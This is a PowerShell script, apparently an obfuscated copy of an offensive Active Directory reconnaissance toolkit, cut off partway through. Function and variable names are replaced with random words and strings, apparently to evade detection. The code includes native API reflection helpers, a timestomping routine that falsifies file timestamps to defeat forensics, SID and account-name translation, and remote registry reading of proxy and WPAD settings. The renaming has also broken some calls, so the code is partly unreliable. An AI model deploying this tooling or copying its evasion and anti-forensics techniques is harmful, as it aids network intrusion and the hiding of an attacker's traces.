











function amputated
{


    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $juMiphiTLHCJCLE = [AppDomain]::CurrentDomain.GetAssemblies()

    ForEach ($IKCP9WQYQfxoreD in $juMiphiTLHCJCLE) {
        if ($IKCP9WQYQfxoreD.FullName -and ($IKCP9WQYQfxoreD.FullName.Split(',')[0] -eq $ModuleName)) {
            return $IKCP9WQYQfxoreD
        }
    }

    $yLCMQjNXlSGJlzk = New-Object Reflection.AssemblyName($ModuleName)
    $KKbtTlEQY9KtTfJ = [AppDomain]::CurrentDomain
    $IPiyJG9qXIVZrVh = $KKbtTlEQY9KtTfJ.DefineDynamicAssembly($yLCMQjNXlSGJlzk, 'Run')
    $mDP9NBdqkxsnaTM = $IPiyJG9qXIVZrVh.DefineDynamicModule($ModuleName, $False)

    return $mDP9NBdqkxsnaTM
}




function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $QQDWOvojOeRaVdg = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $QQDWOvojOeRaVdg['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $QQDWOvojOeRaVdg['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $QQDWOvojOeRaVdg['Charset'] = $Charset }
    if ($SetLastError) { $QQDWOvojOeRaVdg['SetLastError'] = $SetLastError }

    New-Object PSObject -Property $QQDWOvojOeRaVdg
}


function frivolity
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $xZTfPSAZeBEHdjA = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $xZTfPSAZeBEHdjA[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $xZTfPSAZeBEHdjA[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {

            if (!$xZTfPSAZeBEHdjA.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $xZTfPSAZeBEHdjA[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $xZTfPSAZeBEHdjA[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $ZlLwXueeCbvL9Sf = $xZTfPSAZeBEHdjA[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)


            $i = 1
            ForEach($TokjrgfRwtNIJGI in $ParameterTypes)
            {
                if ($TokjrgfRwtNIJGI.IsByRef)
                {
                    [void] $ZlLwXueeCbvL9Sf.DefineParameter($i, 'Out', $Null)
                }

                $i++
            }

            $DnDmtD9V9IfzhHR = [Runtime.InteropServices.DllImportAttribute]
            $UwjbIybTYBOrCPc = $DnDmtD9V9IfzhHR.GetField('SetLastError')
            $ekCQcExOqyUSoZg = $DnDmtD9V9IfzhHR.GetField('CallingConvention')
            $PAucxsgHXe9vrtb = $DnDmtD9V9IfzhHR.GetField('CharSet')
            if ($SetLastError) { $fruaIRffzs9HRdR = $True } else { $fruaIRffzs9HRdR = $False }


            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $IqbxdMiWUOL9rgm = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($UwjbIybTYBOrCPc, $ekCQcExOqyUSoZg, $PAucxsgHXe9vrtb),
                [Object[]] @($fruaIRffzs9HRdR, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $ZlLwXueeCbvL9Sf.SetCustomAttribute($IqbxdMiWUOL9rgm)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $xZTfPSAZeBEHdjA
        }

        $W9ZrkRiLyotDBtG = @{}

        ForEach ($Key in $xZTfPSAZeBEHdjA.Keys)
        {
            $Type = $xZTfPSAZeBEHdjA[$Key].CreateType()

            $W9ZrkRiLyotDBtG[$Key] = $Type
        }

        return $W9ZrkRiLyotDBtG
    }
}


function cramming
{


    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $gsgPBsxidjTtTOn,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $qaaqpxFIXAKJ9oN,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($gsgPBsxidjTtTOn))
    }

    $Vsf9oLTfe9hdDyY = $Type -as [Type]

    $soPxdKPZXKpbAaJ = $Module.DefineEnum($gsgPBsxidjTtTOn, 'Public', $Vsf9oLTfe9hdDyY)

    if ($Bitfield)
    {
        $Kh9i9Lreukg9ajW = [FlagsAttribute].GetConstructor(@())
        $VxaH9KaDlY9isvh = New-Object Reflection.Emit.CustomAttributeBuilder($Kh9i9Lreukg9ajW, @())
        $soPxdKPZXKpbAaJ.SetCustomAttribute($VxaH9KaDlY9isvh)
    }

    ForEach ($Key in $qaaqpxFIXAKJ9oN.Keys)
    {

        $Null = $soPxdKPZXKpbAaJ.DefineLiteral($Key, $qaaqpxFIXAKJ9oN[$Key] -as $Vsf9oLTfe9hdDyY)
    }

    $soPxdKPZXKpbAaJ.CreateType()
}




function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $qWHwvhldsoz9ShI,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $EChkaBfKA9QH99A,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $qWHwvhldsoz9ShI
        Type = $Type -as [Type]
        Offset = $EChkaBfKA9QH99A
        MarshalAs = $MarshalAs
    }
}


function mudslinging
{


    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $gsgPBsxidjTtTOn,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $AbEB9WoUxRyDAPC,

        [Reflection.Emit.PackingSize]
        $LBptAbNEtMVF9nJ = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $c9ZhRrvjx9SKCoI
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($gsgPBsxidjTtTOn))
    }

    [Reflection.TypeAttributes] $hdYxHBrPji9jHQn = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($c9ZhRrvjx9SKCoI)
    {
        $hdYxHBrPji9jHQn = $hdYxHBrPji9jHQn -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $hdYxHBrPji9jHQn = $hdYxHBrPji9jHQn -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $kqaP9dDYwctlOFy = $Module.DefineType($gsgPBsxidjTtTOn, $hdYxHBrPji9jHQn, [ValueType], $LBptAbNEtMVF9nJ)
    $FzaZrhkoNtvjlYk = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $gnojTOAqTHTIXbD = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $SLAmEOIcYW9sLRD = New-Object Hashtable[]($AbEB9WoUxRyDAPC.Count)




    ForEach ($Field in $AbEB9WoUxRyDAPC.Keys)
    {
        $Index = $AbEB9WoUxRyDAPC[$Field]['Position']
        $SLAmEOIcYW9sLRD[$Index] = @{FieldName = $Field; Properties = $AbEB9WoUxRyDAPC[$Field]}
    }

    ForEach ($Field in $SLAmEOIcYW9sLRD)
    {
        $umz9uCvqw9ygRjz = $Field['FieldName']
        $kdGgxQSGa9lyfoF = $Field['Properties']

        $EChkaBfKA9QH99A = $kdGgxQSGa9lyfoF['Offset']
        $Type = $kdGgxQSGa9lyfoF['Type']
        $MarshalAs = $kdGgxQSGa9lyfoF['MarshalAs']

        $9wxXrYrskEIcEAJ = $kqaP9dDYwctlOFy.DefineField($umz9uCvqw9ygRjz, $Type, 'Public')

        if ($MarshalAs)
        {
            $kimW9RStCvMTwjb = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $vZUfBnT9HRcIs9s = New-Object Reflection.Emit.CustomAttributeBuilder($FzaZrhkoNtvjlYk,
                    $kimW9RStCvMTwjb, $gnojTOAqTHTIXbD, @($Size))
            }
            else
            {
                $vZUfBnT9HRcIs9s = New-Object Reflection.Emit.CustomAttributeBuilder($FzaZrhkoNtvjlYk, [Object[]] @($kimW9RStCvMTwjb))
            }

            $9wxXrYrskEIcEAJ.SetCustomAttribute($vZUfBnT9HRcIs9s)
        }

        if ($c9ZhRrvjx9SKCoI) { $9wxXrYrskEIcEAJ.SetOffset($EChkaBfKA9QH99A) }
    }



    $dbEHBuMvoSizaaw = $kqaP9dDYwctlOFy.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $qv9NyU9XzqILNvh = $dbEHBuMvoSizaaw.GetILGenerator()

    $qv9NyU9XzqILNvh.Emit([Reflection.Emit.OpCodes]::Ldtoken, $kqaP9dDYwctlOFy)
    $qv9NyU9XzqILNvh.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $qv9NyU9XzqILNvh.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $qv9NyU9XzqILNvh.Emit([Reflection.Emit.OpCodes]::Ret)



    $ItVTjOfrbKarQ9T = $kqaP9dDYwctlOFy.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $kqaP9dDYwctlOFy,
        [Type[]] @([IntPtr]))
    $yQiDYWo9TshGUUe = $ItVTjOfrbKarQ9T.GetILGenerator()
    $yQiDYWo9TshGUUe.Emit([Reflection.Emit.OpCodes]::Nop)
    $yQiDYWo9TshGUUe.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $yQiDYWo9TshGUUe.Emit([Reflection.Emit.OpCodes]::Ldtoken, $kqaP9dDYwctlOFy)
    $yQiDYWo9TshGUUe.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $yQiDYWo9TshGUUe.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $yQiDYWo9TshGUUe.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $kqaP9dDYwctlOFy)
    $yQiDYWo9TshGUUe.Emit([Reflection.Emit.OpCodes]::Ret)

    $kqaP9dDYwctlOFy.CreateType()
}








function flubbing {

    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True,
        ValueFromPipelineByPropertyName=$True)]
        [System.Management.Automation.PSObject]
        $Zn9bDMjUbWFbrFK,

        [Parameter(Mandatory=$True, Position=0)]
        [Alias('PSPath')]
        [String]
        $piSVdrubQFOiYrj
    )

    process {
        
        $pXNNDvsaQzvEySN = $Zn9bDMjUbWFbrFK | ConvertTo-Csv -NoTypeInformation


        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex';
        $Null = $Mutex.WaitOne()

        if (Test-Path -Path $piSVdrubQFOiYrj) {

            $pXNNDvsaQzvEySN | Foreach-Object {$Start=$True}{if ($Start) {$Start=$False} else {$_}} | Out-File -Encoding 'ASCII' -Append -QQxmdPmFgnSXPuF $piSVdrubQFOiYrj
        }
        else {
            $pXNNDvsaQzvEySN | Out-File -Encoding 'ASCII' -Append -QQxmdPmFgnSXPuF $piSVdrubQFOiYrj
        }

        $Mutex.ReleaseMutex()
    }
}



function pole {

    [CmdletBinding(DefaultParameterSetName = 'Touch')]
    Param (

        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $QQxmdPmFgnSXPuF,

        [Parameter(ParameterSetName = 'Touch')]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $NpkiNtMkQpzVFLQ,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $QlAlGOrUBDR9tWb,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $gxSEHYJHTeQslsy,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $lUrqsjtppUtrzlb,

        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        $yWcTpqlqxf9f9TG
    )


    function jetties {

        param($YEzGcEZVcPalXP9)

        if (!(Test-Path -Path $YEzGcEZVcPalXP9)) {Throw 'File Not Found'}
        $N9mfOdFBWjIrqFB = (Get-Item $YEzGcEZVcPalXP9)

        $oSJMXLbeU9iqjpF = @{'Modified' = ($N9mfOdFBWjIrqFB.LastWriteTime);
                              'Accessed' = ($N9mfOdFBWjIrqFB.LastAccessTime);
                              'Created' = ($N9mfOdFBWjIrqFB.CreationTime)};
        $knlBteRVwginSk9 = New-Object -TypeName PSObject -Property $oSJMXLbeU9iqjpF
        Return $knlBteRVwginSk9
    }

    $N9mfOdFBWjIrqFB = (Get-Item -Path $QQxmdPmFgnSXPuF)

    if ($PSBoundParameters['AllMacAttributes']) {
        $QlAlGOrUBDR9tWb = $yWcTpqlqxf9f9TG
        $gxSEHYJHTeQslsy = $yWcTpqlqxf9f9TG
        $lUrqsjtppUtrzlb = $yWcTpqlqxf9f9TG
    }

    if ($PSBoundParameters['OldFilePath']) {
        $TqLy9UM9CEQWVdE = (jetties $NpkiNtMkQpzVFLQ)
        $QlAlGOrUBDR9tWb = $TqLy9UM9CEQWVdE.Modified
        $gxSEHYJHTeQslsy = $TqLy9UM9CEQWVdE.Accessed
        $lUrqsjtppUtrzlb = $TqLy9UM9CEQWVdE.Created
    }

    if ($QlAlGOrUBDR9tWb) {$N9mfOdFBWjIrqFB.LastWriteTime = $QlAlGOrUBDR9tWb}
    if ($gxSEHYJHTeQslsy) {$N9mfOdFBWjIrqFB.LastAccessTime = $gxSEHYJHTeQslsy}
    if ($lUrqsjtppUtrzlb) {$N9mfOdFBWjIrqFB.CreationTime = $lUrqsjtppUtrzlb}

    Return (jetties $QQxmdPmFgnSXPuF)
}


function addresses {


    param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $FecOPtJSvEj9tUk,

        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $pozLcepMbUqH9g9
    )


    pole -QQxmdPmFgnSXPuF $FecOPtJSvEj9tUk -NpkiNtMkQpzVFLQ $pozLcepMbUqH9g9


    Copy-Item -Path $FecOPtJSvEj9tUk -Destination $pozLcepMbUqH9g9
}


function biochemists {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $kEneZcxTTiuFrPZ = ''
    )
    process {
        try {

            $ZMfjGz9FzIKcj9l = @(([Net.Dns]::GetHostEntry($kEneZcxTTiuFrPZ)).AddressList)

            if ($ZMfjGz9FzIKcj9l.Count -ne 0) {
                ForEach ($txcsRvewcVdZtUk in $ZMfjGz9FzIKcj9l) {

                    if ($txcsRvewcVdZtUk.AddressFamily -eq 'InterNetwork') {
                        $txcsRvewcVdZtUk.IPAddressToString
                    }
                }
            }
        }
        catch {
            Write-Verbose -Message 'Could not resolve host to an IP Address.'
        }
    }
    end {}
}


function replays {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        [Alias('Name')]
        $OADAUGURRbgtTDp,

        [String]
        $KKbtTlEQY9KtTfJ = (skulked).Name
    )

    process {
        
        $OADAUGURRbgtTDp = $OADAUGURRbgtTDp -replace "/","\"
        
        if($OADAUGURRbgtTDp.contains("\")) {

            $KKbtTlEQY9KtTfJ = $OADAUGURRbgtTDp.split("\")[0]
            $OADAUGURRbgtTDp = $OADAUGURRbgtTDp.split("\")[1]
        }

        try {
            $Obj = (New-Object System.Security.Principal.NTAccount($KKbtTlEQY9KtTfJ,$OADAUGURRbgtTDp))
            $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
        }
        catch {
            Write-Verbose "Invalid object/name: $KKbtTlEQY9KtTfJ\$OADAUGURRbgtTDp"
            $Null
        }
    }
}


function die {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $SID
    )

    process {
        try {
            $SID2 = $SID.trim('*')



            Switch ($SID2)
            {
                'S-1-0'         { 'Null Authority' }
                'S-1-0-0'       { 'Nobody' }
                'S-1-1'         { 'World Authority' }
                'S-1-1-0'       { 'Everyone' }
                'S-1-2'         { 'Local Authority' }
                'S-1-2-0'       { 'Local' }
                'S-1-2-1'       { 'Console Logon ' }
                'S-1-3'         { 'Creator Authority' }
                'S-1-3-0'       { 'Creator Owner' }
                'S-1-3-1'       { 'Creator Group' }
                'S-1-3-2'       { 'Creator Owner Server' }
                'S-1-3-3'       { 'Creator Group Server' }
                'S-1-3-4'       { 'Owner Rights' }
                'S-1-4'         { 'Non-unique Authority' }
                'S-1-5'         { 'NT Authority' }
                'S-1-5-1'       { 'Dialup' }
                'S-1-5-2'       { 'Network' }
                'S-1-5-3'       { 'Batch' }
                'S-1-5-4'       { 'Interactive' }
                'S-1-5-6'       { 'Service' }
                'S-1-5-7'       { 'Anonymous' }
                'S-1-5-8'       { 'Proxy' }
                'S-1-5-9'       { 'Enterprise Domain Controllers' }
                'S-1-5-10'      { 'Principal Self' }
                'S-1-5-11'      { 'Authenticated Users' }
                'S-1-5-12'      { 'Restricted Code' }
                'S-1-5-13'      { 'Terminal Server Users' }
                'S-1-5-14'      { 'Remote Interactive Logon' }
                'S-1-5-15'      { 'This Organization ' }
                'S-1-5-17'      { 'This Organization ' }
                'S-1-5-18'      { 'Local System' }
                'S-1-5-19'      { 'NT Authority' }
                'S-1-5-20'      { 'NT Authority' }
                'S-1-5-80-0'    { 'All Services ' }
                'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                'S-1-5-32-545'  { 'BUILTIN\Users' }
                'S-1-5-32-546'  { 'BUILTIN\Guests' }
                'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                Default { 
                    $Obj = (New-Object System.Security.Principal.SecurityIdentifier($SID2))
                    $Obj.Translate( [System.Security.Principal.NTAccount]).Value
                }
            }
        }
        catch {

            $SID
        }
    }
}


function Seeger {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $OADAUGURRbgtTDp
    )

    process {

        $OADAUGURRbgtTDp = $OADAUGURRbgtTDp -replace "/","\"
        
        if($OADAUGURRbgtTDp.contains("\")) {

            $KKbtTlEQY9KtTfJ = $OADAUGURRbgtTDp.split("\")[0]
        }


        function Invoke-Method([__ComObject] $Object, [String] $ZlLwXueeCbvL9Sf, $EcwpRfjLar9eapz) {
            $PDtcqZc9adJiexN = $Object.GetType().InvokeMember($ZlLwXueeCbvL9Sf, "InvokeMethod", $Null, $Object, $EcwpRfjLar9eapz)
            if ( $PDtcqZc9adJiexN ) { $PDtcqZc9adJiexN }
        }
        function Set-Property([__ComObject] $Object, [String] $XCOUeFeDWYv9emv, $EcwpRfjLar9eapz) {
            [Void] $Object.GetType().InvokeMember($XCOUeFeDWYv9emv, "SetProperty", $Null, $Object, $EcwpRfjLar9eapz)
        }

        $CpQ9ZLhTkqTO9qI = New-Object -ComObject NameTranslate

        try {
            Invoke-Method $CpQ9ZLhTkqTO9qI "Init" (1, $KKbtTlEQY9KtTfJ)
        }
        catch [System.Management.Automation.MethodInvocationException] { 
            Write-Debug "Error with translate init in Seeger: $_"
        }

        Set-Property $CpQ9ZLhTkqTO9qI "ChaseReferral" (0x60)

        try {
            Invoke-Method $CpQ9ZLhTkqTO9qI "Set" (3, $OADAUGURRbgtTDp)
            (Invoke-Method $CpQ9ZLhTkqTO9qI "Get" (2))
        }
        catch [System.Management.Automation.MethodInvocationException] {
            Write-Debug "Error with translate Set/Get in Seeger: $_"
        }
    }
}


function Myers {


    [CmdletBinding()]
    param(
        [String] $OADAUGURRbgtTDp
    )

    $KKbtTlEQY9KtTfJ = ($OADAUGURRbgtTDp -split "@")[1]

    $OADAUGURRbgtTDp = $OADAUGURRbgtTDp -replace "/","\"


    function Invoke-Method([__ComObject] $object, [String] $ZlLwXueeCbvL9Sf, $EcwpRfjLar9eapz) {
        $PDtcqZc9adJiexN = $object.GetType().InvokeMember($ZlLwXueeCbvL9Sf, "InvokeMethod", $NULL, $object, $EcwpRfjLar9eapz)
        if ( $PDtcqZc9adJiexN ) { $PDtcqZc9adJiexN }
    }
    function Set-Property([__ComObject] $object, [String] $XCOUeFeDWYv9emv, $EcwpRfjLar9eapz) {
        [Void] $object.GetType().InvokeMember($XCOUeFeDWYv9emv, "SetProperty", $NULL, $object, $EcwpRfjLar9eapz)
    }

    $CpQ9ZLhTkqTO9qI = New-Object -comobject NameTranslate

    try {
        Invoke-Method $CpQ9ZLhTkqTO9qI "Init" (1, $KKbtTlEQY9KtTfJ)
    }
    catch [System.Management.Automation.MethodInvocationException] { }

    Set-Property $CpQ9ZLhTkqTO9qI "ChaseReferral" (0x60)

    try {
        Invoke-Method $CpQ9ZLhTkqTO9qI "Set" (5, $OADAUGURRbgtTDp)
        (Invoke-Method $CpQ9ZLhTkqTO9qI "Get" (3))
    }
    catch [System.Management.Automation.MethodInvocationException] { $_ }
}


function heeling {

    
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        $Value,

        [Switch]
        $VnJraNO9NZROVGW
    )

    begin {


        $fcGeJWWzPzidKCk = New-Object System.Collections.Specialized.OrderedDictionary
        $fcGeJWWzPzidKCk.Add("SCRIPT", 1)
        $fcGeJWWzPzidKCk.Add("ACCOUNTDISABLE", 2)
        $fcGeJWWzPzidKCk.Add("HOMEDIR_REQUIRED", 8)
        $fcGeJWWzPzidKCk.Add("LOCKOUT", 16)
        $fcGeJWWzPzidKCk.Add("PASSWD_NOTREQD", 32)
        $fcGeJWWzPzidKCk.Add("PASSWD_CANT_CHANGE", 64)
        $fcGeJWWzPzidKCk.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $fcGeJWWzPzidKCk.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $fcGeJWWzPzidKCk.Add("NORMAL_ACCOUNT", 512)
        $fcGeJWWzPzidKCk.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $fcGeJWWzPzidKCk.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $fcGeJWWzPzidKCk.Add("SERVER_TRUST_ACCOUNT", 8192)
        $fcGeJWWzPzidKCk.Add("DONT_EXPIRE_PASSWORD", 65536)
        $fcGeJWWzPzidKCk.Add("MNS_LOGON_ACCOUNT", 131072)
        $fcGeJWWzPzidKCk.Add("SMARTCARD_REQUIRED", 262144)
        $fcGeJWWzPzidKCk.Add("TRUSTED_FOR_DELEGATION", 524288)
        $fcGeJWWzPzidKCk.Add("NOT_DELEGATED", 1048576)
        $fcGeJWWzPzidKCk.Add("USE_DES_KEY_ONLY", 2097152)
        $fcGeJWWzPzidKCk.Add("DONT_REQ_PREAUTH", 4194304)
        $fcGeJWWzPzidKCk.Add("PASSWORD_EXPIRED", 8388608)
        $fcGeJWWzPzidKCk.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $fcGeJWWzPzidKCk.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)

    }

    process {

        $puVZkdsxWdwPBWO = New-Object System.Collections.Specialized.OrderedDictionary

        if($Value -is [Int]) {
            $hdGPq9aZMSvu9Gj = $Value
        }

        if ($Value -is [PSCustomObject]) {
            if($Value.useraccountcontrol) {
                $hdGPq9aZMSvu9Gj = $Value.useraccountcontrol
            }
        }

        if($hdGPq9aZMSvu9Gj) {

            if($VnJraNO9NZROVGW) {
                foreach ($hRWO9fYIsjpMzLD in $fcGeJWWzPzidKCk.GetEnumerator()) {
                    if( ($hdGPq9aZMSvu9Gj -band $hRWO9fYIsjpMzLD.Value) -eq $hRWO9fYIsjpMzLD.Value) {
                        $puVZkdsxWdwPBWO.Add($hRWO9fYIsjpMzLD.Name, "$($hRWO9fYIsjpMzLD.Value)+")
                    }
                    else {
                        $puVZkdsxWdwPBWO.Add($hRWO9fYIsjpMzLD.Name, "$($hRWO9fYIsjpMzLD.Value)")
                    }
                }
            }
            else {
                foreach ($hRWO9fYIsjpMzLD in $fcGeJWWzPzidKCk.GetEnumerator()) {
                    if( ($hdGPq9aZMSvu9Gj -band $hRWO9fYIsjpMzLD.Value) -eq $hRWO9fYIsjpMzLD.Value) {
                        $puVZkdsxWdwPBWO.Add($hRWO9fYIsjpMzLD.Name, "$($hRWO9fYIsjpMzLD.Value)")
                    }
                }                
            }
        }

        $puVZkdsxWdwPBWO
    }
}


function tinker {

    param(
        [Parameter(ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $kEneZcxTTiuFrPZ = $ENV:COMPUTERNAME
    )

    process {
        try {
            $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $kEneZcxTTiuFrPZ)
            $WtHFLJ9MTogHZAc = $Reg.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
            $TsQHiRpzRXCsYPz = $WtHFLJ9MTogHZAc.GetValue('ProxyServer')
            $ZGhkSdJeGLo9g9a = $WtHFLJ9MTogHZAc.GetValue('AutoConfigURL')

            if($ZGhkSdJeGLo9g9a -and ($ZGhkSdJeGLo9g9a -ne "")) {
                try {
                    $Wpad = (New-Object Net.Webclient).DownloadString($ZGhkSdJeGLo9g9a)
                }
                catch {
                    $Wpad = ""
                }
            }
            else {
                $Wpad = ""
            }
            
            if($TsQHiRpzRXCsYPz -or $ZGhkSdJeGLo9g9a) {

                $QQDWOvojOeRaVdg = @{
                    'ProxyServer' = $TsQHiRpzRXCsYPz
                    'AutoConfigURL' = $ZGhkSdJeGLo9g9a
                    'Wpad' = $Wpad
